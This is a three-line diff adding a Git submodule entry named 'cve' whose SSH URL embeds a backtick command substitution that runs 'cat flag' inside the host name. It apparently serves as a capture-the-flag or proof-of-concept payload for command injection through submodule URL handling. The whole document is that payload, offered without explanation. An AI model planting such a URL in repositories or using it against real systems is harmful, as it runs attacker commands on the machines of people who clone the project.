@@ -1,0 +1,3 @@
+[submodule "cve"]
+	path = cve
+	url = ssh://`cat flag`foo.example.com/bar
